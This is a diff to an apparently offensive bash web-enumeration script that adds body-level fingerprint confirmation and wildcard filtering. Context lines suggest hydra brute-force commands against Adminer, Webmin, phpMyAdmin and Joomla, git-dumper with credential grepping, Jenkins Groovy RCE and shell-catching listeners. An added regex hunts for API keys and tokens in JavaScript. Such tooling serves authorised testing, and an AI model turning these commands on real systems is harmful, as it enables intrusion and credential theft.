@@ -20,6 +20,11 @@
 #   - Timeouts on everything — nothing hangs the engagement
 #   - Graceful degradation — skips tools that aren't installed
 #   - Resume support — re-run safely; skips completed phases
+#   - Wildcard-aware fingerprinting — servers that 200/301 on every path
+#     (e.g. Mezzanine/Django wildcard catch-alls) previously produced a
+#     dozen false positives (bogus Joomla/Tomcat/Jenkins/etc). All CMS
+#     and framework detections now require body-level marker corroboration
+#     via _confirm_fingerprint() before emitting next-step commands.
 #
 # USAGE:
 #   ./webenum.sh --url http://10.10.10.5           # single URL
@@ -366,6 +371,68 @@ append_next_finding() {
     } >> "$next_file"
 }
 
+# Why: wordlist/sensitive-path keyword matches produce floods of false positives on
+# hosts that wildcard-respond (e.g. nginx catch-all 301). This helper fetches a
+# candidate path, then requires the response body/headers to contain a service-
+# specific marker before a fingerprint is accepted. Callers chain with || to try
+# multiple probe paths.
+# Args: $1=base_url  $2=probe_path  $3=marker_regex  [$4=status_regex (default 200|301|302|401|403)]
+# Returns 0 if status acceptable AND marker found in response (headers+body).
+_confirm_fingerprint() {
+    local base_url="$1"
+    local probe_path="$2"
+    local marker="$3"
+    local ok_status="${4:-200|301|302|401|403}"
+    local url="${base_url%/}${probe_path}"
+    local hdr_tmp body_tmp status rc
+    hdr_tmp=$(mktemp) || return 1
+    body_tmp=$(mktemp) || { rm -f "$hdr_tmp"; return 1; }
+    status=$(timeout 6 curl -sk -A 'Mozilla/5.0' --max-time 5 \
+        -D "$hdr_tmp" -o "$body_tmp" -w '%{http_code}' "$url" 2>/dev/null || echo "")
+    if ! [[ "$status" =~ ^(${ok_status})$ ]]; then
+        rm -f "$hdr_tmp" "$body_tmp"
+        return 1
+    fi
+    # Strip headers that reflect the probe path (Location on 301/302 trailing-slash
+    # redirects contains e.g. "/adminer.php/", which would self-match "Adminer" —
+    # a real false positive seen on nginx against 192.168.227.62).
+    { grep -v -iE '^(Location|Content-Location|Refresh|Link):' "$hdr_tmp" 2>/dev/null
+      head -c 20000 "$body_tmp" 2>/dev/null; } | grep -qiE "$marker"
+    rc=$?
+    rm -f "$hdr_tmp" "$body_tmp"
+    return $rc
+}
+
+# Why: when the target returns the same (status,size,words,lines) tuple to a
+# known-non-existent path, every ffuf result matches that tuple — a carpet of
+# false "hits". This helper reads the baseline file and drops rows matching it.
+# Args: $1=ffuf_text_file  $2=baseline_file
+_drop_wildcard_ffuf_rows() {
+    local ffuf_file="$1"
+    local baseline="$2"
+    [[ -s "$ffuf_file" && -s "$baseline" ]] || return 0
+    local b_status b_size
+    b_status=$(awk -F= '/^status=/ {gsub(/ .*/,"",$2); print $2; exit}' "$baseline" 2>/dev/null)
+    b_size=$(awk '/^status=/ {for (i=1;i<=NF;i++) if ($i ~ /^size=/) {sub(/size=/,"",$i); print $i; exit}}' "$baseline" 2>/dev/null)
+    [[ -n "$b_status" && -n "$b_size" ]] || return 0
+    # ffuf text row format: "FUZZTERM URL | STATUS | SIZE | WORDS | LINES".
+    # Line 1 is the column header, line 2 is the dashed separator — keep both.
+    # Previous regex /^(FUZZ|URL|-)/ leaked real matches whose fuzz term started
+    # with URL (e.g. URLrewrite, URL_Picker) because the row literally begins
+    # with "URL". We now gate on line number + a numeric-status check.
+    awk -v s="$b_status" -v sz="$b_size" -F'|' '
+        NR <= 2 { print; next }
+        /^-+$/ { print; next }
+        $2 !~ /^[[:space:]]*[0-9]+[[:space:]]*$/ { print; next }
+        NF < 3 { print; next }
+        {
+            st=$2; si=$3;
+            gsub(/ /,"",st); gsub(/ /,"",si);
+            if (st == s && si == sz) next;
+            print
+        }' "$ffuf_file" > "${ffuf_file}.tmp" && mv "${ffuf_file}.tmp" "$ffuf_file"
+}
+
 #==============================================================================
 # URL PARSING HELPERS
 #==============================================================================
@@ -589,9 +656,22 @@ PYEOF
     find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
         grep -hEo '(/[A-Za-z0-9._~:/?#\[\]@!$&'\''()*+,;=%-]{3,})' "$js_file" 2>/dev/null || true
     done | sort -u > "$outdir/js_endpoints.txt"
-    find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
-        grep -hinE 'api[_-]?key|token|secret|password|passwd|authorization|bearer|client[_-]?secret|aws_|s3_|jdbc:|mongodb' "$js_file" 2>/dev/null || true
-    done | head -100 > "$outdir/js_secret_hints.txt"
+    # Why: bare keyword grep floods on framework code — jQuery's "input:password"
+    # selector, Bootstrap's "autoToken" variable, etc. Two filters applied:
+    # (1) filename blocklist for well-known libraries (case-insensitive basename);
+    # (2) pattern must look like an assignment with a quoted literal of >=6 chars,
+    # or match a high-entropy API-key shape (OpenAI sk-, AWS AKIA, JWT).
+    {
+        find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
+            base=$(basename "$js_file")
+            case "${base,,}" in
+                jquery*|bootstrap*|angular*|react*|vue*|ember*|backbone*|lodash*|underscore*|moment*|popper*|d3*|chart*|highcharts*|swagger-ui*|modernizr*|prototype*|mootools*|dojo*|ext*)
+                    continue ;;
+            esac
+            grep -hnE '(api[_-]?key|token|secret|password|authorization|bearer|client[_-]?secret|aws[_-]?(access[_-]?key|secret)?|s3[_-]?secret|jdbc:|mongodb://[^[:space:]]*:)[^A-Za-z0-9]{0,4}[:=][^A-Za-z0-9]{0,4}["'\''][^"'\'']{6,}["'\'']' "$js_file" 2>/dev/null || true
+            grep -hnEo '(sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)' "$js_file" 2>/dev/null || true
+        done
+    } | head -100 > "$outdir/js_secret_hints.txt"
     find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
         grep -hEo 'sourceMappingURL=[^[:space:]]+' "$js_file" 2>/dev/null | sed 's/^sourceMappingURL=//' || true
     done | sort -u > "$outdir/js_source_maps.txt"
@@ -607,27 +687,44 @@ PYEOF
         > "$outdir/security_txt.txt" 2>&1 || true
 
     # --- Check for common sensitive paths directly ---
+    # Why: before probing, check if the server wildcards unknown paths (returns a
+    # "findable" code to every request — e.g. nginx catch-all 301). If so, the
+    # probe can't distinguish real hits from noise, so suppress the list to avoid
+    # feeding false positives into downstream fingerprint greps.
     info "  → probing common sensitive paths"
-    # shellcheck disable=SC2016  # $1 is expanded by the inner bash -c
-    timeout "$PHASE_FINGERPRINT_TIMEOUT" bash -c '
-        url="$1"
-        echo "# Sensitive path probes — 200/301/302/401/403 = potentially interesting"
-        echo ""
-        for path in \
-            "/.git/HEAD" "/.git/config" "/.env" "/.htaccess" "/.htpasswd" \
-            "/web.config" "/config.php" "/configuration.php" "/wp-config.php" \
-            "/phpinfo.php" "/.DS_Store" "/backup.zip" "/backup.tar.gz" \
-            "/admin" "/administrator" "/login" "/wp-admin" "/manager" \
-            "/phpmyadmin" "/adminer" "/console" "/api" "/api/v1" \
-            "/swagger.json" "/swagger-ui" "/openapi.json" \
-            "/_profiler" "/debug" "/.well-known"; do
-            resp=$(timeout 5 curl -sk -o /dev/null -w "%{http_code}" \
-                -A "Mozilla/5.0" "${url%/}${path}" 2>/dev/null || echo "ERR")
-            if echo "$resp" | grep -qE "^(200|301|302|401|403)$"; then
-                echo "  [${resp}] ${url%/}${path}"
-            fi
-        done
-    ' -- "$url" > "$outdir/sensitive_paths.txt" 2>&1 || warn "Sensitive path probing timed out"
+    local wildcard_path wildcard_status
+    wildcard_path="/$(tr -dc 'a-z' </dev/urandom 2>/dev/null | head -c 16)-nope"
+    wildcard_status=$(timeout 5 curl -sk -o /dev/null -w '%{http_code}' \
+        -A 'Mozilla/5.0' --max-time 5 "${url%/}${wildcard_path}" 2>/dev/null || echo "ERR")
+    if echo "$wildcard_status" | grep -qE '^(200|301|302|401|403)$'; then
+        {
+            echo "# Sensitive path probes — SUPPRESSED"
+            echo "# Wildcard detected: server returns HTTP $wildcard_status to random path ${wildcard_path}"
+            echo "# Every probe would match the wildcard, so results are indistinguishable from noise."
+            echo "# Fingerprint detection falls back to body-level confirmation (see next_steps.txt)."
+        } > "$outdir/sensitive_paths.txt"
+    else
+        # shellcheck disable=SC2016  # $1 is expanded by the inner bash -c
+        timeout "$PHASE_FINGERPRINT_TIMEOUT" bash -c '
+            url="$1"
+            echo "# Sensitive path probes — 200/301/302/401/403 = potentially interesting"
+            echo ""
+            for path in \
+                "/.git/HEAD" "/.git/config" "/.env" "/.htaccess" "/.htpasswd" \
+                "/web.config" "/config.php" "/configuration.php" "/wp-config.php" \
+                "/phpinfo.php" "/.DS_Store" "/backup.zip" "/backup.tar.gz" \
+                "/admin" "/administrator" "/login" "/wp-admin" "/manager" \
+                "/phpmyadmin" "/adminer" "/console" "/api" "/api/v1" \
+                "/swagger.json" "/swagger-ui" "/openapi.json" \
+                "/_profiler" "/debug" "/.well-known"; do
+                resp=$(timeout 5 curl -sk -o /dev/null -w "%{http_code}" \
+                    -A "Mozilla/5.0" "${url%/}${path}" 2>/dev/null || echo "ERR")
+                if echo "$resp" | grep -qE "^(200|301|302|401|403)$"; then
+                    echo "  [${resp}] ${url%/}${path}"
+                fi
+            done
+        ' -- "$url" > "$outdir/sensitive_paths.txt" 2>&1 || warn "Sensitive path probing timed out"
+    fi
 
     # --- Operator workflow notes grounded in this target URL ---
     {
@@ -834,6 +931,8 @@ phase_content() {
 
         # Also save human-readable version
         ffuf_json_to_text "$outdir/dirs_medium.json" > "$outdir/dirs_medium.txt" 2>/dev/null || true
+        # Drop rows matching the wildcard baseline (size=0 nginx catch-all etc.)
+        _drop_wildcard_ffuf_rows "$outdir/dirs_medium.txt" "$outdir/ffuf_baseline.txt"
     fi
 
     # --- 2b: File fuzzing with extensions ---
@@ -853,6 +952,7 @@ phase_content() {
         _tool_done "ffuf files" "$_ffuf_f_t0"
 
         ffuf_json_to_text "$outdir/files_medium.json" > "$outdir/files_medium.txt" 2>/dev/null || true
+        _drop_wildcard_ffuf_rows "$outdir/files_medium.txt" "$outdir/ffuf_baseline.txt"
     fi
 
     # --- 2c: If raft-large exists AND we're in deep mode, run it too ---
@@ -866,6 +966,7 @@ phase_content() {
             > "$outdir/dirs_large_console.txt" 2>&1 || phase_ok=false
 
         ffuf_json_to_text "$outdir/dirs_large.json" > "$outdir/dirs_large.txt" 2>/dev/null || true
+        _drop_wildcard_ffuf_rows "$outdir/dirs_large.txt" "$outdir/ffuf_baseline.txt"
     fi
 
     _prune_useless_files "$outdir"
@@ -1429,10 +1530,14 @@ generate_next_steps() {
             "searchsploit laravel"
     fi
 
-    if grep -qiE 'Werkzeug|Django.*DEBUG|Traceback \(most recent call last\)|debugger|__debugger__' "$work_dir/fingerprint/headers.txt" "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt 2>/dev/null; then
+    # Why: bare "debugger"/"Traceback" keywords match legitimate JS and body text.
+    # Require the Werkzeug X-Powered-By header or a live traceback page.
+    if grep -qiE '^X-Powered-By:[[:space:]]*Werkzeug' "$work_dir/fingerprint/headers.txt" 2>/dev/null \
+        || _confirm_fingerprint "$url" "/?__debugger__=yes" 'Werkzeug|__debugger__' \
+        || _confirm_fingerprint "$url" "/debug/" 'Werkzeug|Traceback \(most recent call last\)'; then
         append_next_finding "$next_file" \
             "Debug framework indicators found" \
-            "headers/source/content matched Werkzeug, Django DEBUG, traceback, or debugger markers" \
+            "Werkzeug header present OR live debugger/traceback page confirmed" \
             "curl -sk ${url%/}/?__debugger__=yes | sed -n '1,80p'" \
             "curl -sk ${url%/}/debug | sed -n '1,80p'" \
             "searchsploit werkzeug django debug"
@@ -1464,10 +1569,13 @@ generate_next_steps() {
     local cms_whatweb="$work_dir/fingerprint/whatweb.txt"
     local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"
 
-    if grep -qiE '/\.git/(HEAD|config)|\.git/HEAD' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt 2>/dev/null; then
+    # Why: wildcard hosts redirect /.git/HEAD to a 301/200 with no content. A real
+    # exposed repo serves a body starting "ref: refs/heads/..." or a [core] block.
+    if _confirm_fingerprint "$url" "/.git/HEAD" '^ref:[[:space:]]+refs/' "200" \
+        || _confirm_fingerprint "$url" "/.git/config" '\[core\]' "200"; then
         append_next_finding "$next_file" \
             "Exposed Git repository found" \
-            "sensitive path or content output matched /.git/HEAD or /.git/config" \
+            "/.git/HEAD served 'ref:' line or /.git/config served [core] section" \
             "curl -sk ${url%/}/.git/HEAD" \
             "git-dumper ${url%/}/.git ./git_$(get_host "$url")" \
             "grep -RniE 'pass|secret|key|token|cred|db_' ./git_$(get_host "$url") 2>/dev/null | head -50"
@@ -1518,10 +1626,15 @@ generate_next_steps() {
             "${cgi_cmds[@]:0:10}"
     fi
 
-    if grep -qiE 'swagger|openapi|api-docs' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+    # Why: the word "swagger" shows up in HTML/JS for unrelated reasons. Require a
+    # real JSON spec response containing "swagger" or "openapi" as a JSON key.
+    if _confirm_fingerprint "$url" "/swagger.json" '"(swagger|openapi)"[[:space:]]*:' "200" \
+        || _confirm_fingerprint "$url" "/openapi.json" '"(swagger|openapi)"[[:space:]]*:' "200" \
+        || _confirm_fingerprint "$url" "/v2/api-docs" '"(swagger|openapi)"[[:space:]]*:' "200" \
+        || _confirm_fingerprint "$url" "/swagger-ui/" '<title>[^<]*Swagger' "200"; then
         append_next_finding "$next_file" \
             "Swagger/OpenAPI surface found" \
-            "path/source output matched swagger/openapi/api-docs" \
+            "live JSON spec or swagger-ui page confirmed" \
             "curl -sk ${url%/}/swagger.json | jq .info,.paths 2>/dev/null" \
             "curl -sk ${url%/}/openapi.json | jq .info,.paths 2>/dev/null" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403"
@@ -1543,25 +1656,34 @@ generate_next_steps() {
             "${api_cmds[@]:0:8}"
     fi
 
-    if grep -qiE '/actuator|spring|whitelabel error page' "$work_dir/fingerprint/whatweb.txt" "$work_dir/fingerprint/headers.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+    # Why: bare "spring" matches many unrelated words. Require /actuator to return
+    # the characteristic HATEOAS JSON ("_links") or the Whitelabel error markup.
+    if _confirm_fingerprint "$url" "/actuator" '"_links"[[:space:]]*:' "200" \
+        || _confirm_fingerprint "$url" "/actuator/health" '"status"[[:space:]]*:[[:space:]]*"(UP|DOWN)"' "200" \
+        || _confirm_fingerprint "$url" "/error" 'Whitelabel Error Page|org\.springframework'; then
         append_next_finding "$next_file" \
             "Spring actuator or Spring app indicators found" \
-            "fingerprint/content output matched Spring or actuator" \
+            "/actuator returned Spring HATEOAS JSON or Whitelabel error confirmed" \
             "curl -sk ${url%/}/actuator" \
             "curl -sk ${url%/}/actuator/env | jq . 2>/dev/null" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u ${url%/}/FUZZ -mc 200,401,403"
     fi
 
-    if grep -qiE 'Adminer|/adminer' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt 2>/dev/null; then
+    # Why: wordlist entries like /adminer match on wildcard hosts. Require the
+    # Adminer login page body marker.
+    if _confirm_fingerprint "$url" "/adminer.php" 'Adminer|<title>[^<]*Login' \
+        || _confirm_fingerprint "$url" "/adminer/" 'Adminer|<title>[^<]*Login'; then
         append_next_finding "$next_file" \
             "Adminer detected" \
-            "whatweb/path/content output matched Adminer" \
+            "/adminer(.php)? served Adminer login body" \
             "curl -sk ${url%/}/adminer/ | sed -n '1,80p'" \
             "curl -sk ${url%/}/adminer.php | sed -n '1,80p'" \
             "hydra -l root -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/adminer.php:auth[server]=localhost&auth[username]=^USER^&auth[password]=^PASS^:F=Login failed'"
     fi
 
-    if grep -qiE 'Grafana|grafana' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+    # Why: /api/health returns JSON with "commit" + "version" on Grafana.
+    if _confirm_fingerprint "$url" "/api/health" '"commit"[[:space:]]*:|"database"[[:space:]]*:' "200" \
+        || _confirm_fingerprint "$url" "/login" '<title>[^<]*Grafana|grafana-app'; then
         local grafana_cmds=(
             "curl -sk ${url%/}/login | sed -n '1,80p'"
             "curl -sk ${url%/}/api/health"
@@ -1569,32 +1691,41 @@ generate_next_steps() {
         grafana_cmds+=("nuclei -u ${url%/} -tags grafana")
         append_next_finding "$next_file" \
             "Grafana detected" \
-            "fingerprint/content output matched Grafana" \
+            "/api/health returned Grafana JSON or /login served Grafana markup" \
             "${grafana_cmds[@]}"
     fi
 
-    if grep -qiE 'Webmin|webmin' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+    # Why: Webmin runs its own HTTP server (MiniServ) — the Server header or
+    # /session_login.cgi landing page are distinctive.
+    if _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*MiniServ|<title>[^<]*Webmin' \
+        || _confirm_fingerprint "$url" "/session_login.cgi" 'Webmin|MiniServ'; then
         append_next_finding "$next_file" \
             "Webmin detected" \
-            "fingerprint/content output matched Webmin" \
+            "MiniServ server header or Webmin login page confirmed" \
             "curl -skI ${url%/}/" \
             "searchsploit webmin" \
             "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} https-post-form '/session_login.cgi:user=^USER^&pass=^PASS^:F=Login failed'"
     fi
 
-    if grep -qiE 'JBoss|WildFly|jmx-console|/jmx-console|/web-console' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+    # Why: require the real console login page or a JBoss-named Server header.
+    if _confirm_fingerprint "$url" "/jmx-console/" 'JBoss|JMX Console|WildFly' \
+        || _confirm_fingerprint "$url" "/web-console/" 'JBoss|WildFly' \
+        || _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*(JBoss|WildFly|Apache-Coyote.*JBoss)'; then
         append_next_finding "$next_file" \
             "JBoss/WildFly management surface found" \
-            "fingerprint/content output matched JBoss/WildFly console" \
+            "JBoss/WildFly console served content or Server header confirmed" \
             "curl -skI ${url%/}/jmx-console/" \
             "curl -skI ${url%/}/web-console/" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
     fi
 
-    if grep -qiE 'Elasticsearch|\"cluster_name\"|/_cat|:9200' "$cms_whatweb" "$work_dir/fingerprint/headers.txt" "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt 2>/dev/null; then
+    # Why: ES exposes distinctive JSON on / (version.number + tagline) and
+    # /_cluster/health (cluster_name + status).
+    if _confirm_fingerprint "$url" "/" '"cluster_name"|"tagline"[[:space:]]*:[[:space:]]*"You Know, for Search"' "200" \
+        || _confirm_fingerprint "$url" "/_cluster/health" '"cluster_name"[[:space:]]*:' "200"; then
         append_next_finding "$next_file" \
             "Elasticsearch indicators found" \
-            "fingerprint/source/content output matched Elasticsearch" \
+            "live JSON from / or /_cluster/health with cluster_name confirmed" \
             "curl -sk ${url%/}/_cluster/health?pretty" \
             "curl -sk ${url%/}/_cat/indices?v" \
             "curl -sk ${url%/}/_search?pretty -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}},\"size\":5}'"
@@ -1616,7 +1747,10 @@ generate_next_steps() {
             "${vhost_cmds[@]}"
     fi
 
-    if grep -qi 'WordPress\|wp-login\|wp-content' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: real WP serves /wp-login.php with WP-specific markup, or the homepage
+    # has wp-content/wp-includes asset links.
+    if _confirm_fingerprint "$url" "/wp-login.php" 'WordPress|wp-submit|name="log"' \
+        || _confirm_fingerprint "$url" "/" '/wp-content/|/wp-includes/|<meta name="generator" content="WordPress'; then
         local wordpress_cmds=(
             "curl -sk ${url%/}/wp-login.php | sed -n '1,40p'"
             "wpscan --url ${url%/} --enumerate u,p,t --plugins-detection passive -o /tmp/${HOST_SAFE}_wpscan_baseline.txt"
@@ -1628,32 +1762,42 @@ generate_next_steps() {
         )
         append_next_finding "$next_file" \
             "WordPress detected" \
-            "whatweb or path probes matched WordPress" \
+            "wp-login form body or wp-content/wp-includes assets confirmed" \
             "${wordpress_cmds[@]}"
     fi
 
-    if grep -qi 'Joomla\|/administrator' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: the word "administrator" matches the wildcard wordlist. Require the
+    # Joomla generator meta tag or admin login form markup.
+    if _confirm_fingerprint "$url" "/administrator/index.php" 'Joomla!|mod-login|name="username"' \
+        || _confirm_fingerprint "$url" "/" '<meta name="generator" content="Joomla!'; then
         append_next_finding "$next_file" \
             "Joomla detected" \
-            "whatweb or path probes matched Joomla/administrator" \
+            "Joomla generator meta tag or /administrator login body confirmed" \
             "joomscan --url ${url%/} --enumerate-components" \
             "curl -sk ${url%/}/administrator/ | sed -n '1,60p'" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla.fuzz.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
     fi
 
-    if grep -qi 'Drupal\|CHANGELOG.txt\|/user/login' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: real Drupal exposes X-Generator header or /sites/default asset paths.
+    if _confirm_fingerprint "$url" "/" '<meta name="Generator" content="Drupal|^X-Generator:[[:space:]]*Drupal|/sites/default/files/' \
+        || _confirm_fingerprint "$url" "/CHANGELOG.txt" '^Drupal [0-9]' "200" \
+        || _confirm_fingerprint "$url" "/user/login" 'user-login-form|name="form_id" value="user_login'; then
         append_next_finding "$next_file" \
             "Drupal detected" \
-            "whatweb or path probes matched Drupal" \
+            "Drupal generator meta/header, CHANGELOG.txt, or user-login-form confirmed" \
             "droopescan scan drupal -u ${url%/}" \
             "curl -sk ${url%/}/CHANGELOG.txt | head -20" \
             "curl -sk ${url%/}/user/login | sed -n '1,60p'"
     fi
 
-    if grep -qi 'Tomcat\|/manager\|/manager/html' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: real Tomcat exposes Apache-Coyote Server header or Tomcat realm in the
+    # manager's WWW-Authenticate / body. Wildcard paths don't.
+    if _confirm_fingerprint "$url" "/manager/html" 'Tomcat|Apache Coyote|realm="Tomcat' \
+        || _confirm_fingerprint "$url" "/manager/status" 'Tomcat|Apache Coyote' \
+        || _confirm_fingerprint "$url" "/" '^Server:[[:space:]]*Apache-Coyote'; then
         append_next_finding "$next_file" \
             "Tomcat manager surface detected" \
-            "whatweb or path probes matched Tomcat/manager" \
+            "Tomcat/Coyote Server header or manager realm confirmed" \
             "curl -skI ${url%/}/manager/html" \
             "curl -skI ${url%/}/manager/status" \
             "# Brute default creds (tomcat:tomcat, admin:admin, manager:manager, tomcat:s3cret):" \
@@ -1664,10 +1808,14 @@ generate_next_steps() {
             "curl -sk ${url%/}/shell/   # trigger deployed shell (nc -lvnp 4444)"
     fi
 
-    if grep -qi 'Jenkins\|/jenkins\|/script' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: Jenkins sends X-Jenkins / X-Hudson headers; /api/json returns its
+    # characteristic _class tree; login page has "Jenkins" in title.
+    if _confirm_fingerprint "$url" "/" '^X-Jenkins:|^X-Hudson:' \
+        || _confirm_fingerprint "$url" "/api/json" '"_class"[[:space:]]*:[[:space:]]*"hudson\.' \
+        || _confirm_fingerprint "$url" "/login" '<title>[^<]*Jenkins|Jenkins-Crumb'; then
         append_next_finding "$next_file" \
             "Jenkins detected" \
-            "whatweb or path probes matched Jenkins" \
+            "Jenkins/Hudson header, /api/json _class tree, or login title confirmed" \
             "curl -sk ${url%/}/login | sed -n '1,80p'" \
             "curl -skI ${url%/}/script" \
             "# If /script accessible (unauthenticated or after login) — Groovy RCE:" \
@@ -1679,10 +1827,13 @@ generate_next_steps() {
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
     fi
 
-    if grep -qi 'phpMyAdmin\|phpmyadmin\|/pma' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+    # Why: phpMyAdmin login page has pma_username input or phpMyAdmin title/assets.
+    if _confirm_fingerprint "$url" "/phpmyadmin/" 'pma_username|phpMyAdmin|<title>[^<]*phpMyAdmin' \
+        || _confirm_fingerprint "$url" "/pma/" 'pma_username|phpMyAdmin' \
+        || _confirm_fingerprint "$url" "/phpmyadmin/index.php" 'pma_username|phpMyAdmin'; then
         append_next_finding "$next_file" \
             "phpMyAdmin detected" \
-            "whatweb or path probes matched phpMyAdmin" \
+            "phpMyAdmin login form (pma_username input) or title confirmed" \
             "curl -sk ${url%/}/phpmyadmin/ | sed -n '1,80p'" \
             "hydra -l root -P /usr/share/wordlists/fasttrack.txt -s $(get_port "$url") $(get_host "$url") $(get_proto "$url")-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'" \
             "# After login — read files:" \
@@ -2154,8 +2305,9 @@ generate_summary() {
 
         echo ""
         echo "## WordPress Detected"
-        if grep -qi 'WordPress\|wp-login\|wp-content' "$work_dir/fingerprint/whatweb.txt" 2>/dev/null || \
-           grep -qi 'wp-login\|wp-admin' "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null; then
+        # Require live WP-login body or wp-content/wp-includes asset links.
+        if _confirm_fingerprint "$url" "/wp-login.php" 'WordPress|wp-submit|name="log"' \
+            || _confirm_fingerprint "$url" "/" '/wp-content/|/wp-includes/|<meta name="generator" content="WordPress'; then
             local wp_host
             wp_host=$(get_host "$url" | tr '.:' '_')
             echo "  WordPress detected — run baseline wpscan:"
@@ -2175,9 +2327,9 @@ generate_summary() {
             local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"
             local cms_any=false
 
-            # Joomla
-            if grep -qi 'Joomla' "$cms_whatweb" 2>/dev/null || \
-               grep -qi '/administrator' "$cms_paths" 2>/dev/null; then
+            # Joomla — confirm via live admin panel body or meta generator tag
+            if _confirm_fingerprint "$url" "/administrator/index.php" 'Joomla!|mod-login|name="passwd"' \
+                || _confirm_fingerprint "$url" "/" '<meta name="generator" content="Joomla!'; then
                 cms_any=true
                 echo "  Joomla detected:"
                 echo "  joomscan --url ${url} --enumerate-components"
@@ -2185,9 +2337,10 @@ generate_summary() {
                 echo "  # Brute admin: hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^&Submit=Login:F=Invalid'"
             fi
 
-            # Drupal
-            if grep -qi 'Drupal\|drupal' "$cms_whatweb" 2>/dev/null || \
-               grep -qi 'CHANGELOG.txt\|/user/login' "$cms_paths" 2>/dev/null; then
+            # Drupal — confirm via meta generator, user-login form, or CHANGELOG
+            if _confirm_fingerprint "$url" "/" '<meta name="generator" content="Drupal|user-login-form|Drupal\.settings' \
+                || _confirm_fingerprint "$url" "/user/login" 'user-login-form|name="form_id"\s+value="user_login' \
+                || _confirm_fingerprint "$url" "/CHANGELOG.txt" 'Drupal [0-9]'; then
                 cms_any=true
                 echo "  Drupal detected:"
                 echo "  droopescan scan drupal -u ${url}"
@@ -2198,9 +2351,9 @@ generate_summary() {
                 echo "  # CVE-2019-6340 Drupalgeddon3 (8.5.x/8.6.x REST) — see https://github.com/leonjza/CVE-2019-6340"
             fi
 
-            # Apache Tomcat
-            if grep -qi 'Tomcat\|tomcat' "$cms_whatweb" 2>/dev/null || \
-               grep -qi '/manager\|/manager/html' "$cms_paths" 2>/dev/null; then
+            # Apache Tomcat — confirm via Apache-Coyote server header or Tomcat manager realm
+            if _confirm_fingerprint "$url" "/" 'Server:\s*Apache-Coyote|<title>Apache Tomcat' \
+                || _confirm_fingerprint "$url" "/manager/html" 'Tomcat Manager|tomcat-users\.xml' "200|401|403"; then
                 cms_any=true
                 echo "  Apache Tomcat detected:"
                 echo "  curl -sk ${url%/}/manager/html   # manager panel (try tomcat:tomcat, admin:admin)"
@@ -2211,9 +2364,9 @@ generate_summary() {
                 echo "  # Catch with: penelope -p 4444 -O"
             fi
 
-            # Jenkins
-            if grep -qi 'Jenkins\|jenkins' "$cms_whatweb" 2>/dev/null || \
-               grep -qi '/jenkins\|/script' "$cms_paths" 2>/dev/null; then
+            # Jenkins — confirm via X-Jenkins header or Jenkins-specific markup
+            if _confirm_fingerprint "$url" "/" 'X-Jenkins:|X-Hudson:|Jenkins [0-9]|_class":"hudson\.' \
+                || _confirm_fingerprint "$url" "/login" 'Jenkins|j_username'; then
                 cms_any=true
                 echo "  Jenkins detected:"
                 echo "  curl -sk ${url%/}/login   # unauthenticated check"
@@ -2230,9 +2383,10 @@ generate_summary() {
                 echo "  # Catch with: penelope -p 4444 -O"
             fi
 
-            # phpMyAdmin
-            if grep -qi 'phpMyAdmin\|phpmyadmin' "$cms_whatweb" 2>/dev/null || \
-               grep -qi '/phpmyadmin\|/pma' "$cms_paths" 2>/dev/null; then
+            # phpMyAdmin — confirm via PMA-specific login markup at common install paths
+            if _confirm_fingerprint "$url" "/phpmyadmin/" 'pma_username|phpMyAdmin' \
+                || _confirm_fingerprint "$url" "/pma/" 'pma_username|phpMyAdmin' \
+                || _confirm_fingerprint "$url" "/phpMyAdmin/" 'pma_username|phpMyAdmin'; then
                 cms_any=true
                 echo "  phpMyAdmin detected:"
